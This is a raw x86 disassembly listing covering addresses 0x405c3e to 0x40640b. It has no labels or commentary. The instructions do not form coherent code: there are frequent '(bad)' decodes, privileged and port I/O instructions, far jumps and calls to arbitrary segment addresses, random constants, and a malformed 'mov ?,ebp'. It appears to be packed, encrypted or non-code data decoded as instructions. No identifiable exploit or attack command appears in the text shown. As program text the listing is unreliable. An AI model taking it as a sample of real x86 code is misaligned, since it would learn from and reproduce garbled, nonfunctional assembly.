  405c3e:	rol    DWORD PTR [ebx+0x68c59],1
  405c44:	add    BYTE PTR [ebp-0x80],dh
  405c47:	inc    BYTE PTR [eax]
  405c49:	add    ah,dh
  405c4b:	icebp  
  405c4c:	adc    BYTE PTR [esi+0x17ca4922],bh
  405c52:	or     dl,BYTE PTR [ecx+0x7bb58246]
  405c58:	fdivp  st(5),st
  405c5a:	xlat   BYTE PTR ds:[ebx]
  405c5b:	xor    BYTE PTR [ebp+0x69],0x15
  405c5f:	jno    0x405cad
  405c61:	add    eax,0xad070000
  405c66:	dec    edx
  405c67:	mov    ebx,0x3b071f3e
  405c6c:	jg     0x405c60
  405c6e:	fcom   DWORD PTR [esi+0x2d]
  405c71:	fcmovnb st,st(2)
  405c73:	inc    esi
  405c74:	pop    es
  405c75:	mov    eax,ds:0x47440652
  405c7a:	add    BYTE PTR [eax],al
  405c7c:	xchg   edi,eax
  405c7d:	scas   eax,DWORD PTR es:[edi]
  405c7e:	and    BYTE PTR [edx+0x672f3d1f],0x39
  405c85:	jnp    0x405ca5
  405c87:	sub    ecx,DWORD PTR [edx-0xc]
  405c8a:	adc    bl,ah
  405c8c:	jae    0x405c97
  405c8e:	mov    bl,0x10
  405c90:	repnz (bad) 
  405c92:	cmc    
  405c93:	and    DWORD PTR gs:[edx+0x4f8e0a37],0xffffffe4
  405c9b:	icebp  
  405c9c:	inc    edx
  405c9d:	stos   DWORD PTR es:[edi],eax
  405c9e:	add    al,0xeb
  405ca0:	add    BYTE PTR [eax],al
  405ca2:	jmp    0x2227:0xf4c1249d
  405ca9:	inc    ecx
  405caa:	scas   eax,DWORD PTR es:[edi]
  405cab:	ja     0x405c80
  405cad:	add    edx,edi
  405caf:	out    0x3e,al
  405cb1:	cmp    cl,BYTE PTR ds:[ebp+0x71287989]
  405cb8:	ror    BYTE PTR [eax],0x0
  405cbb:	add    BYTE PTR [eax-0x3e],ch
  405cbe:	mov    bh,0x11
  405cc0:	mul    DWORD PTR [ebx]
  405cc2:	aam    0x2d
  405cc4:	xchg   ebp,eax
  405cc5:	mov    esi,0xd270217c
  405cca:	pop    ebp
  405ccb:	dec    sp
  405ccd:	sub    eax,0x49500000
  405cd2:	enter  0x5b,0x0
  405cd6:	mov    ds:0x946b91f6,al
  405cdb:	push   ss
  405cdc:	inc    BYTE PTR [ebp-0x39]
  405cdf:	dec    edx
  405ce0:	cmp    DWORD PTR [eax],0xd3d43a09
  405ce6:	into   
  405ce7:	mov    ebp,0x6d1950af
  405cec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ced:	or     BYTE PTR ss:[ebx],dl
  405cf0:	add    BYTE PTR [eax],al
  405cf2:	mov    DWORD PTR [edi],eax
  405cf4:	sub    al,0xa2
  405cf6:	push   es
  405cf7:	fs scas al,BYTE PTR es:[edi]
  405cf9:	jbe    0x405cc9
  405cfb:	inc    eax
  405cfc:	jno    0x405cfe
  405cfe:	add    bl,dh
  405d00:	or     al,0xef
  405d02:	add    BYTE PTR [eax],al
  405d04:	inc    eax
  405d05:	fld    QWORD PTR [eax]
  405d07:	add    ch,al
  405d09:	sbb    eax,0xb4c06d2a
  405d0e:	add    BYTE PTR [eax],al
  405d10:	mov    esp,DWORD PTR [edx-0x443e1a0b]
  405d16:	retf   0x4d77
  405d19:	dec    esi
  405d1a:	or     al,0xcb
  405d1c:	add    BYTE PTR [eax],al
  405d1e:	(bad)  
  405d1f:	mov    ah,0x4c
  405d21:	xchg   ebx,eax
  405d22:	add    BYTE PTR [eax],al
  405d24:	or     eax,0xe9e85a66
  405d29:	inc    edx
  405d2a:	dec    ebp
  405d2b:	xchg   edx,eax
  405d2c:	sti    
  405d2d:	jp     0x405cd0
  405d2f:	xor    eax,0x5b2af598
  405d34:	add    eax,DWORD PTR [eax+0x1d]
  405d37:	add    BYTE PTR [eax],al
  405d39:	ins    DWORD PTR es:[edi],dx
  405d3a:	gs cmc 
  405d3c:	mov    BYTE PTR [ecx+0x3],0x18
  405d40:	or     edi,DWORD PTR [ebx]
  405d42:	push   esi
  405d44:	fmul   DWORD PTR [ebx-0x57]
  405d47:	out    dx,eax
  405d48:	inc    esi
  405d49:	xor    BYTE PTR [edx],ah
  405d4b:	test   BYTE PTR [esi+0x0],ch
  405d4e:	add    BYTE PTR [esi],cl
  405d50:	push   eax
  405d51:	ss push ebx
  405d53:	in     eax,dx
  405d54:	pop    ebx
  405d55:	call   0x7850:0xfc5ea2da
  405d5c:	sub    BYTE PTR [ecx-0x689e167a],ch
  405d62:	xchg   ebx,eax
  405d63:	clc    
  405d64:	cmp    ah,BYTE PTR [esi]
  405d66:	mov    edi,0xd3a64d5
  405d6b:	data16 mov al,ds:0xa78425
  405d71:	add    BYTE PTR [ebp-0x4f050f8c],ch
  405d77:	rol    DWORD PTR [ebx+0x4486bd68],1
  405d7d:	add    BYTE PTR ds:[eax],al
  405d80:	adc    BYTE PTR [ebx-0x54],0xc3
  405d84:	xchg   BYTE PTR [esi],ch
  405d86:	pop    DWORD PTR [esi]
  405d88:	inc    eax
  405d89:	sti    
  405d8a:	add    BYTE PTR [eax],al
  405d8c:	mov    gs,WORD PTR [edx]
  405d8e:	jmp    0x405dd4
  405d90:	ret    0x0
  405d93:	jno    0x405d6b
  405d95:	pop    esp
  405d96:	cmc    
  405d97:	add    eax,0x4b83532e
  405d9c:	mov    cl,0x20
  405d9e:	repz inc eax
  405da0:	xchg   DWORD PTR [eax],eax
  405da2:	add    ah,dl
  405da4:	aad    0x6c
  405da6:	fwait
  405da7:	data16 cs data16 mov al,ss:0x75fcf77f
  405db0:	dec    eax
  405db1:	push   cs
  405db2:	add    BYTE PTR [eax],al
  405db4:	ja     0x405db0
  405db6:	xchg   DWORD PTR gs:[edx+0x47],edi
  405dba:	jbe    0x405d4c
  405dbc:	ja     0x405dfa
  405dbe:	ins    DWORD PTR es:[edi],dx
  405dbf:	imul   edx,ebp,0x74789987
  405dc5:	ror    al,1
  405dc7:	repnz add BYTE PTR [eax],al
  405dca:	push   0xd4c85a
  405dcf:	add    dh,ch
  405dd1:	cwde   
  405dd2:	std    
  405dd3:	jno    0x405da4
  405dd5:	mov    esp,0xd286214b
  405dda:	mov    WORD PTR [ecx],es
  405ddc:	add    BYTE PTR [eax],al
  405dde:	jae    0x405da1
  405de0:	outs   dx,BYTE PTR ds:[esi]
  405de1:	test   DWORD PTR [eax],ecx
  405de3:	jnp    0x405de5
  405de5:	add    BYTE PTR [ebx-0x44],dh
  405de8:	(bad)  
  405de9:	pop    eax
  405dea:	jae    0x405e1c
  405dec:	xor    ch,cl
  405dee:	fild   QWORD PTR [edx-0x70861dc4]
  405df4:	or     bl,BYTE PTR [edx]
  405df6:	ss mov esp,0xf45c57db
  405dfc:	pop    edi
  405dfd:	push   edx
  405dfe:	lods   eax,DWORD PTR ds:[esi]
  405dff:	enter  0x63,0x0
  405e03:	das    
  405e04:	sub    bh,BYTE PTR [esi+0x2a]
  405e07:	hlt    
  405e08:	or     eax,0xede75753
  405e0d:	ror    DWORD PTR [eax],0x64
  405e10:	add    BYTE PTR [eax],al
  405e12:	rcl    BYTE PTR [edx+ebx*2+0x348846],cl
  405e19:	add    al,cl
  405e1b:	in     eax,dx
  405e1c:	add    BYTE PTR [eax],al
  405e1e:	enter  0x23,0x0
  405e22:	xor    al,dh
  405e24:	rol    DWORD PTR [edx+0x69],1
  405e27:	mov    edi,0xc7cb7c1a
  405e2c:	adc    BYTE PTR [esp+eiz*4+0x42be2b7],dl
  405e33:	or     al,BYTE PTR [eax]
  405e35:	add    ch,dh
  405e37:	xchg   edx,eax
  405e38:	jp     0x405e01
  405e3a:	jg     0x405ddc
  405e3c:	dec    ebp
  405e3d:	and    ah,BYTE PTR [ecx+0x70c854]
  405e43:	add    BYTE PTR [eax],dl
  405e45:	jnp    0x405ec6
  405e47:	je     0x405e0d
  405e49:	cdq    
  405e4a:	add    BYTE PTR [eax],al
  405e4c:	leave  
  405e4d:	jge    0x405ec6
  405e4f:	adc    BYTE PTR [ebx+0x4e],bh
  405e52:	jbe    0x405e10
  405e54:	add    edx,0xf471ef2c
  405e5a:	xchg   ecx,eax
  405e5b:	mov    esp,0x4640
  405e60:	leave  
  405e61:	aam    0xb2
  405e63:	mov    al,ds:0xecfcafd3
  405e68:	sub    DWORD PTR [edx],ebx
  405e6a:	pop    edi
  405e6b:	dec    edx
  405e6c:	sbb    bl,BYTE PTR fs:[ecx+edi*1+0x5f4fd425]
  405e74:	fcom   QWORD PTR [esi+edi*8-0x28c3e304]
  405e7b:	jle    0x405ea5
  405e7d:	sub    eax,0x4a17069f
  405e82:	cmp    DWORD PTR [eax],ecx
  405e84:	mov    cl,0x0
  405e86:	add    ch,dh
  405e88:	mov    bh,0x4d
  405e8a:	jo     0x405e85
  405e8c:	sbb    eax,0x4f8f9886
  405e91:	mov    dh,bh
  405e93:	adc    bh,dh
  405e95:	outs   dx,DWORD PTR ds:[esi]
  405e96:	je     0x405e7a
  405e98:	mov    bl,0xec
  405e9a:	xchg   DWORD PTR [edi+0x4f95376b],ebp
  405ea0:	mov    ebx,0x373577b4
  405ea5:	mov    WORD PTR [eax],fs
  405ea7:	add    BYTE PTR [eax],al
  405ea9:	xchg   esp,eax
  405eaa:	ja     0x405e98
  405eac:	ss jp  0x405eb3
  405eaf:	mov    al,ds:0x97430000
  405eb4:	pop    esp
  405eb5:	jbe    0x405f32
  405eb7:	clc    
  405eb8:	pop    edx
  405eb9:	mov    eax,esi
  405ebb:	das    
  405ebc:	jge    0x405e9a
  405ebe:	xor    BYTE PTR [ecx],al
  405ec0:	lods   eax,DWORD PTR ds:[esi]
  405ec1:	xchg   ecx,eax
  405ec2:	jnp    0x405e6a
  405ec4:	and    BYTE PTR [ebx+0x3c],ch
  405ec7:	cmp    ah,bl
  405ec9:	dec    ebp
  405eca:	ror    DWORD PTR [ecx+0x1fbcc52c],0xb1
  405ed1:	push   edi
  405ed2:	jnp    0x405ec4
  405ed4:	test   al,0xf6
  405ed6:	or     eax,ecx
  405ed8:	retf   0x2d84
  405edb:	add    BYTE PTR [eax],al
  405edd:	cmp    DWORD PTR [ebp*1-0xf209a9c],edx
  405ee4:	sub    cl,BYTE PTR [ebp-0x39369b5]
  405eea:	in     al,dx
  405eeb:	in     eax,0x3b
  405eed:	or     ecx,edi
  405eef:	and    al,0x9e
  405ef1:	mov    esp,0xd6afe3b7
  405ef6:	call   0xdf396c4e
  405efb:	popfw  
  405efd:	test   BYTE PTR fs:[esi+edx*2],0x0
  405f02:	add    BYTE PTR [esi],bl
  405f04:	inc    edi
  405f06:	js     0x405e88
  405f08:	cli    
  405f09:	add    BYTE PTR [eax],al
  405f0b:	sub    BYTE PTR [edx-0x42],dh
  405f0e:	cld    
  405f0f:	jns    0x405e9e
  405f11:	fcomp  st(1)
  405f13:	fwait
  405f14:	or     al,0x69
  405f16:	add    BYTE PTR [eax],al
  405f18:	pop    esp
  405f19:	cdq    
  405f1a:	test   ebp,edi
  405f1c:	push   esp
  405f1d:	jp     0x405f1e
  405f1f:	push   edi
  405f20:	jnp    0x405f39
  405f22:	ret    
  405f23:	add    cl,BYTE PTR [ebp+ecx*8+0x39760000]
  405f2a:	loop   0x405f9c
  405f2c:	or     eax,0x211f8b36
  405f31:	js     0x405efe
  405f33:	pop    edi
  405f34:	push   edx
  405f35:	sub    ah,ch
  405f37:	test   BYTE PTR [ecx-0x6b],0xb1
  405f3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f3c:	jmp    0x36a0:0x22111e7c
  405f43:	push   ss
  405f44:	out    dx,al
  405f45:	inc    edx
  405f46:	(bad)  
  405f48:	dec    eax
  405f49:	add    BYTE PTR [eax],al
  405f4b:	add    BYTE PTR [esi-0x40],bl
  405f4e:	push   0x0
  405f50:	add    bh,ah
  405f52:	popf   
  405f53:	adc    BYTE PTR [ebx-0x7d],cl
  405f56:	ror    ecx,cl
  405f58:	jns    0x405efc
  405f5a:	(bad)  
  405f5b:	inc    eax
  405f5c:	add    BYTE PTR ds:[eax],al
  405f5f:	stos   DWORD PTR es:[edi],eax
  405f60:	call   0xf315acbc
  405f65:	xor    eax,0x41c0b6
  405f6a:	add    BYTE PTR [edx+0x51],ah
  405f6d:	gs stc 
  405f6f:	sub    BYTE PTR [esi+0x51],al
  405f72:	cmp    bl,ch
  405f74:	rol    BYTE PTR [edx],0x0
  405f77:	add    dh,dh
  405f79:	sbb    al,0x6
  405f7b:	adc    eax,0x3a046956
  405f80:	add    BYTE PTR [eax],al
  405f82:	enter  0x25,0x0
  405f86:	(bad)  
  405f87:	xchg   edx,eax
  405f88:	enter  0x92,0x0
  405f8c:	test   al,0xea
  405f8e:	and    al,0xce
  405f90:	sub    BYTE PTR [eax],0x9c
  405f93:	mov    ebx,0x69fef328
  405f98:	js     0x405fd6
  405f9a:	je     0x406011
  405f9c:	std    
  405f9d:	ret    0xdb65
  405fa0:	xchg   ecx,eax
  405fa1:	jg     0x405fdf
  405fa3:	ins    BYTE PTR es:[edi],dx
  405fa4:	idiv   BYTE PTR [edi+0x21]
  405fa7:	mov    eax,0xdeb7fc5a
  405fac:	in     eax,dx
  405fad:	enter  0x70,0x0
  405fb1:	adc    dl,ah
  405fb3:	in     eax,0xc3
  405fb5:	je     0x406010
  405fb7:	dec    esp
  405fb8:	xchg   BYTE PTR [eax],al
  405fba:	add    BYTE PTR [ecx-0x421cb6a9],bl
  405fc0:	or     al,BYTE PTR [ecx]
  405fc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fc3:	mov    al,0x92
  405fc5:	dec    ecx
  405fc6:	and    DWORD PTR [eax],0x42
  405fc9:	repnz in eax,0x3e
  405fcc:	shl    esi,0x67
  405fcf:	adc    BYTE PTR cs:[esi+0x720a837],bl
  405fd6:	mov    al,0xb9
  405fd8:	mov    ds:0xb750d49f,eax
  405fdd:	(bad)  
  405fde:	cli    
  405fdf:	mov    ebx,0x306cfc79
  405fe4:	fs pop ecx
  405fe6:	mov    ebp,0x6e3efa4b
  405feb:	mov    dl,0xeb
  405fed:	imul   ecx,DWORD PTR [ebp+0x67c9aaae],0xffffffc5
  405ff4:	xor    eax,0xc
  405ff9:	push   edi
  405ffa:	jecxz  0x405fdf
  405ffc:	mov    ds:0x2a5406cd,al
  406001:	leave  
  406002:	pop    es
  406003:	and    al,0xd2
  406005:	mov    ss,WORD PTR [esi]
  406007:	out    dx,eax
  406008:	sub    ch,BYTE PTR [edi]
  40600a:	aad    0x49
  40600c:	int    0x92
  40600e:	loop   0x405fbc
  406010:	xchg   esi,eax
  406011:	sub    al,0xa0
  406013:	push   ebx
  406014:	sbb    eax,0x2f8dd930
  406019:	xchg   edi,eax
  40601a:	cmp    al,0x27
  40601c:	cli    
  40601d:	xor    BYTE PTR [ebx-0x48a0f53],bl
  406023:	adc    edi,DWORD PTR [edx+0x51]
  406026:	repz cmp DWORD PTR [eax],esi
  406029:	add    bl,BYTE PTR [esi]
  40602b:	in     eax,0x49
  40602d:	outs   dx,DWORD PTR ds:[esi]
  40602e:	dec    edi
  40602f:	xchg   ecx,eax
  406030:	xchg   BYTE PTR [edx-0xe],dl
  406033:	in     eax,0x70
  406035:	mov    edx,0xca855bfe
  40603a:	sbb    ch,BYTE PTR ds:0xc50476
  406040:	add    BYTE PTR [ecx+0x4b],bl
  406043:	mov    dl,0xac
  406045:	push   ebp
  406046:	xchg   ch,dh
  406048:	cmp    esp,0x652a76ee
  40604e:	or     DWORD PTR [edi+0x9665164],ebp
  406054:	into   
  406055:	jle    0x4060a3
  406057:	fiadd  WORD PTR [eax]
  406059:	add    BYTE PTR [edx+eiz*2],dl
  40605c:	mov    ah,0x66
  40605e:	mov    edx,0x7842f0ef
  406063:	or     al,0xdf
  406065:	add    BYTE PTR [eax],al
  406067:	mov    dl,0xfa
  406069:	imul   esi,DWORD PTR [edx],0x33
  40606c:	shl    bh,0x0
  40606f:	add    BYTE PTR [eax+0x6d],bh
  406072:	and    eax,0x3bdcee01
  406077:	push   es
  406078:	loopne 0x4060bc
  40607a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40607b:	xchg   edx,eax
  40607c:	and    al,0xd2
  40607e:	jge    0x406040
  406080:	add    BYTE PTR es:[eax],al
  406083:	jae    0x4060f0
  406085:	and    eax,0xf98aae90
  40608a:	aaa    
  40608b:	inc    ecx
  40608c:	add    eax,0x97298b63
  406091:	add    DWORD PTR [esi-0x42],0x7773aa17
  406098:	pop    edx
  406099:	call   0xf432ca50
  40609e:	mov    esi,0x95f3f01c
  4060a3:	js     0x40603d
  4060a5:	cmp    ch,dh
  4060a7:	shl    BYTE PTR [eax+0x0],0x0
  4060ab:	and    al,0xfc
  4060ad:	inc    ebp
  4060ae:	mov    al,0xbd
  4060b0:	mov    ds:0xb7c18728,eax
  4060b5:	mov    edx,0xbd44
  4060ba:	(bad)  
  4060bc:	push   esi
  4060bd:	pusha  
  4060be:	sub    DWORD PTR [esi+0x2289f230],0xffffffa9
  4060c5:	repnz push ecx
  4060c7:	cmc    
  4060c8:	(bad)  
  4060c9:	mov    edx,0x7d197bb8
  4060ce:	scas   al,BYTE PTR es:[edi]
  4060cf:	mov    esi,0xb0ade98a
  4060d4:	fwait
  4060d5:	jns    0x40612b
  4060d7:	lods   eax,DWORD PTR cs:[esi]
  4060d9:	add    dh,BYTE PTR ds:0xe30974b9
  4060df:	cmp    edi,DWORD PTR [edi-0x74]
  4060e2:	lds    eax,FWORD PTR [eax]
  4060e4:	add    BYTE PTR [edx],bh
  4060e6:	cmp    bh,BYTE PTR [ecx]
  4060e8:	jl     0x406085
  4060ea:	mov    esi,0x271c92cd
  4060ef:	mov    ?,ebp
  4060f1:	and    eax,0xfe302537
  4060f6:	cmp    esi,DWORD PTR [ecx]
  4060f8:	repz mov dl,0x3f
  4060fb:	adc    DWORD PTR [edx-0x29e701a6],esp
  406101:	add    eax,0x792da1b5
  406106:	mov    dh,0xe8
  406108:	xor    edi,ebp
  40610a:	into   
  40610b:	stc    
  40610c:	cwde   
  40610d:	clc    
  40610e:	mov    ebp,0xd38ce7
  406113:	add    ah,dh
  406115:	retf   0x9211
  406118:	jbe    0x4060ec
  40611a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40611b:	sub    ecx,edx
  40611d:	repnz mov al,BYTE PTR [ecx-0x42bb290f]
  406124:	add    BYTE PTR [eax],al
  406126:	int    0xe9
  406128:	mov    ebp,0x2a4c
  40612d:	sub    BYTE PTR [esi+0xe827d3f],bh
  406133:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406134:	pop    esp
  406135:	jp     0x406126
  406137:	sub    eax,0x31c4
  40613c:	push   cs
  40613d:	loope  0x4060e5
  40613f:	cmp    DWORD PTR [eax],edx
  406141:	lods   eax,DWORD PTR es:[esi]
  406143:	pop    eax
  406144:	(bad)  
  406145:	(bad)  
  406146:	or     eax,0x71a4b6a2
  40614b:	xchg   edi,eax
  40614c:	js     0x4061b3
  40614e:	jbe    0x40614b
  406150:	jle    0x406156
  406152:	mov    al,BYTE PTR [eax]
  406154:	add    BYTE PTR [edx+0xf5cc],ah
  40615a:	add    BYTE PTR [eax+eax*1-0x2f435700],ch
  406161:	cwde   
  406162:	fild   QWORD PTR [ecx-0x6d35e43a]
  406168:	jns    0x4060ec
  40616a:	shr    BYTE PTR [edx-0x6de175c8],cl
  406170:	mov    esp,0xfbb6640e
  406175:	lea    edx,[eax-0x29]
  406178:	lods   eax,DWORD PTR ds:[esi]
  406179:	cmp    BYTE PTR [edi+0x7f],dl
  40617c:	popa   
  40617d:	das    
  40617e:	scas   al,BYTE PTR es:[edi]
  40617f:	push   edi
  406180:	sbb    dh,BYTE PTR [esi+0x12]
  406183:	aas    
  406184:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406185:	mov    al,0xb2
  406187:	in     eax,dx
  406188:	pushf  
  406189:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40618a:	fimul  DWORD PTR [eax-0x72]
  40618d:	add    BYTE PTR [eax],al
  40618f:	xchg   ebx,ebx
  406191:	add    al,0xb7
  406193:	add    BYTE PTR [eax],al
  406195:	mov    ebp,0x4c49fa79
  40619a:	cmc    
  40619b:	add    BYTE PTR [eax],al
  40619d:	sbb    DWORD PTR [ebx+0x1],esi
  4061a0:	arpl   WORD PTR [ebx+0x6c],bp
  4061a3:	jmp    0x30f7917c
  4061a8:	dec    edi
  4061a9:	nop
  4061aa:	jne    0x406132
  4061ac:	or     edi,esi
  4061ae:	cwde   
  4061af:	and    ebx,DWORD PTR [ecx]
  4061b1:	cli    
  4061b2:	rcl    DWORD PTR [ebx+0x3bc54333],0xe4
  4061b9:	or     BYTE PTR ds:[ebx+0x0],dh
  4061bd:	add    BYTE PTR ds:0x3ebcd57c,dh
  4061c3:	jmp    0xa6e1e6
  4061c8:	add    ch,ah
  4061ca:	pusha  
  4061cb:	cwde   
  4061cc:	lea    ebp,[edi]
  4061ce:	arpl   WORD PTR [ebx+0x22],cx
  4061d1:	test   BYTE PTR [eax-0x7f3e0000],bh
  4061d7:	cdq    
  4061d8:	add    BYTE PTR [eax],al
  4061da:	mov    esi,0xf10ac541
  4061df:	loop   0x406163
  4061e1:	adc    DWORD PTR [eax],0x6c
  4061e4:	ja     0x406217
  4061e6:	inc    ebp
  4061e7:	scas   eax,DWORD PTR es:[edi]
  4061e8:	outs   dx,BYTE PTR ds:[esi]
  4061e9:	jle    0x4061d4
  4061eb:	cmp    edi,DWORD PTR [eax]
  4061ed:	jge    0x406215
  4061ef:	(bad)  
  4061f0:	adc    ebx,ecx
  4061f2:	sub    esp,DWORD PTR [ecx-0x3a]
  4061f5:	cdq    
  4061f6:	add    ah,BYTE PTR [edx-0x1568c121]
  4061fc:	lods   eax,DWORD PTR ds:[esi]
  4061fd:	arpl   WORD PTR [eax+0x6705e27],bx
  406203:	or     bl,al
  406205:	add    BYTE PTR [eax],al
  406207:	push   esp
  406208:	inc    esi
  406209:	mov    ebp,0xfa775fe2
  40620e:	loopne 0x406267
  406210:	in     eax,0x23
  406212:	add    bh,BYTE PTR [edi]
  406214:	xor    bl,BYTE PTR [esi+0x20]
  406217:	int3   
  406218:	add    al,BYTE PTR [eax]
  40621a:	add    BYTE PTR [ecx-0x52],dh
  40621d:	test   DWORD PTR [edx+0x60d2ba6c],esi
  406223:	and    DWORD PTR [eax],esp
  406225:	push   esi
  406226:	sar    DWORD PTR [esi-0x7ac8ae0d],cl
  40622c:	fist   WORD PTR [esi]
  40622e:	mov    ecx,0xc5e724e3
  406233:	or     DWORD PTR [esi],0x73c878
  406239:	add    BYTE PTR [ecx-0x3],dl
  40623c:	pop    edx
  40623d:	and    eax,0xe280
  406242:	nop
  406243:	sub    DWORD PTR [edx],ebp
  406245:	or     eax,DWORD PTR [ebx]
  406247:	je     0x406209
  406249:	mov    ds:0x94740000,eax
  40624e:	sub    ch,BYTE PTR [ebx]
  406250:	ins    DWORD PTR es:[edi],dx
  406251:	popf   
  406252:	dec    eax
  406253:	dec    ebp
  406254:	add    BYTE PTR [eax],al
  406256:	pop    ebx
  406257:	cmp    eax,0x862739bc
  40625c:	push   ds
  40625d:	daa    
  40625e:	jg     0x4062d1
  406260:	jp     0x4062cd
  406262:	jbe    0x406262
  406264:	dec    ebp
  406266:	cmp    ebp,DWORD PTR [ebp-0x1646b524]
  40626c:	hlt    
  40626d:	pusha  
  40626e:	mul    DWORD PTR [edi+0x34]
  406271:	dec    esi
  406272:	jno    0x40628e
  406274:	mov    bl,0x3c
  406276:	(bad)  
  406277:	sub    cl,dh
  406279:	in     eax,dx
  40627a:	mov    esp,0xcbe39fac
  40627f:	inc    ebp
  406280:	xchg   esi,eax
  406281:	mov    ecx,0x7d022953
  406286:	je     0x406216
  406288:	sahf   
  406289:	jg     0x4062e6
  40628b:	pushf  
  40628c:	popf   
  40628d:	adc    DWORD PTR [ecx],esp
  40628f:	lods   al,BYTE PTR ds:[esi]
  406290:	daa    
  406291:	repz sub DWORD PTR [ecx],esp
  406294:	or     BYTE PTR [edx],bl
  406296:	add    BYTE PTR [eax],al
  406298:	jae    0x40630e
  40629a:	out    dx,al
  40629b:	and    BYTE PTR [eax-0x18dfc5c4],bl
  4062a1:	iret   
  4062a2:	add    al,0x78
  4062a4:	add    BYTE PTR [eax],al
  4062a6:	imul   edi,DWORD PTR [ebx-0x4f],0x3f78bbbe
  4062ad:	jmp    0x56ecbecd
  4062b2:	repz scas eax,DWORD PTR es:[edi]
  4062b4:	cmp    ebx,ebp
  4062b6:	fcmovnbe st,st(4)
  4062b8:	mov    ecx,0xc03d2b4b
  4062bd:	mov    BYTE PTR [eax],0x0
  4062c0:	loope  0x4062d5
  4062c2:	push   ss
  4062c3:	fmul   QWORD PTR [ebp-0x44]
  4062c6:	push   0xc927ce2b
  4062cb:	push   edi
  4062cc:	and    ebx,DWORD PTR [edi+0x6775403]
  4062d2:	xor    DWORD PTR [ebx+0x74],ebx
  4062d5:	mov    fs,WORD PTR [ecx+0x57]
  4062d8:	push   ebp
  4062d9:	mov    bl,0x2d
  4062db:	jg     0x406338
  4062dd:	mov    edx,0xe9c89c
  4062e2:	add    cl,bh
  4062e4:	repnz sbb al,0x34
  4062e7:	cs jno 0x40626b
  4062ea:	std    
  4062eb:	add    bh,BYTE PTR [eax-0x5e7ee983]
  4062f1:	cmp    DWORD PTR [ebp+0x29],0x2b
  4062f5:	push   es
  4062f6:	test   BYTE PTR [esi-0x3f80eb4e],0x3c
  4062fd:	add    BYTE PTR [eax],al
  4062ff:	mov    ebp,0x973ebce4
  406304:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406305:	sub    eax,DWORD PTR [esi+0x61]
  406308:	cmc    
  406309:	jns    0x40633f
  40630b:	cdq    
  40630c:	pop    ebx
  40630d:	pop    esi
  40630e:	cmp    dh,BYTE PTR [edx+0x204e5995]
  406314:	xor    DWORD PTR [edi+0x71],edi
  406317:	(bad)  
  406318:	lods   al,BYTE PTR ds:[esi]
  406319:	jne    0x406356
  40631b:	icebp  
  40631c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40631d:	cld    
  40631e:	in     eax,0xd8
  406320:	mov    esp,0xdaf4c2bb
  406325:	pushf  
  406326:	daa    
  406327:	xor    eax,0xb22270b8
  40632c:	out    dx,al
  40632d:	les    esp,FWORD PTR [ecx+0x0]
  406330:	add    BYTE PTR [ebp+0x4f],bh
  406333:	call   0x0:0xb804b579
  40633a:	ficomp WORD PTR [edi+0x55a5a007]
  406340:	call   0xfafd40c1
  406345:	repnz cli 
  406347:	cmp    edi,DWORD PTR [ebx-0x65]
  40634a:	fincstp 
  40634c:	xor    BYTE PTR [edx-0x6787d096],dl
  406352:	out    0x77,eax
  406354:	bound  edi,QWORD PTR [edx+0x53]
  406357:	cmp    DWORD PTR [esi-0x4dc17a0c],edi
  40635d:	cwde   
  40635e:	push   esp
  40635f:	hlt    
  406360:	sub    eax,0x9240
  406365:	xlat   BYTE PTR ds:[ebx]
  406366:	sub    esp,DWORD PTR [edi]
  406368:	arpl   WORD PTR [ecx],ax
  40636a:	in     eax,0x46
  40636c:	jg     0x4063d1
  40636e:	aas    
  40636f:	sbb    dh,dl
  406371:	inc    esp
  406372:	sldt   WORD PTR [eax]
  406375:	aas    
  406376:	dec    esi
  406377:	call   0x2be4:0x7561f94b
  40637e:	jne    0x406329
  406380:	int    0x2b
  406382:	inc    esi
  406383:	xchg   ecx,eax
  406384:	jmp    0xa2e:0x31f3eeb5
  40638b:	out    dx,eax
  40638c:	addr16 icebp 
  40638e:	(bad)  
  40638f:	xor    BYTE PTR [ebp+0x3e],al
  406392:	sub    DWORD PTR [edx-0x68a7d76f],esi
  406398:	mov    bh,0x15
  40639a:	js     0x40634f
  40639c:	pop    eax
  40639d:	das    
  40639e:	pop    ds
  40639f:	add    esp,ebx
  4063a1:	clc    
  4063a2:	test   BYTE PTR [ebx],al
  4063a4:	add    BYTE PTR [eax],al
  4063a6:	pusha  
  4063a7:	pop    ebp
  4063a8:	sub    edx,DWORD PTR [edi+0x63]
  4063ab:	xor    al,0x77
  4063ad:	ror    BYTE PTR [eax],cl
  4063af:	dec    ebp
  4063b0:	add    BYTE PTR [eax],al
  4063b2:	mov    bl,0x59
  4063b4:	js     0x406347
  4063b6:	xchg   esi,eax
  4063b7:	es push 0xffffffbd
  4063ba:	xor    BYTE PTR [ecx],bh
  4063bc:	pop    ecx
  4063bd:	clc    
  4063be:	or     edi,DWORD PTR [ebx]
  4063c0:	cwde   
  4063c1:	xchg   esp,eax
  4063c2:	jmp    0x2d54:0x9e09bef9
  4063c9:	pushf  
  4063ca:	cmp    al,0xec
  4063cc:	adc    DWORD PTR [edx-0x6105d309],0x980158e3
  4063d6:	mov    ecx,0x11f33d25
  4063db:	sub    DWORD PTR [edx-0x4cf34b08],esp
  4063e1:	add    BYTE PTR [eax],al
  4063e3:	sbb    al,0xfa
  4063e5:	mov    edx,0xd30201a2
  4063ea:	daa    
  4063eb:	sbb    ah,BYTE PTR [edx+0x28]
  4063ee:	push   ecx
  4063ef:	popa   
  4063f0:	popf   
  4063f1:	out    dx,eax
  4063f2:	aas    
  4063f3:	cmc    
  4063f4:	imul   edi,eax,0x3d
  4063f7:	nop
  4063f8:	not    edx
  4063fa:	int3   
  4063fb:	cld    
  4063fc:	add    BYTE PTR [eax],al
  4063fe:	sbb    dh,dl
  406400:	sub    BYTE PTR [esi],bh
  406402:	ss xchg edi,eax
  406404:	nop
  406405:	push   eax
  406406:	out    0x90,eax
  406408:	cmp    dl,BYTE PTR [edi]
  40640a:	(bad)  
  40640b:	push   ecx
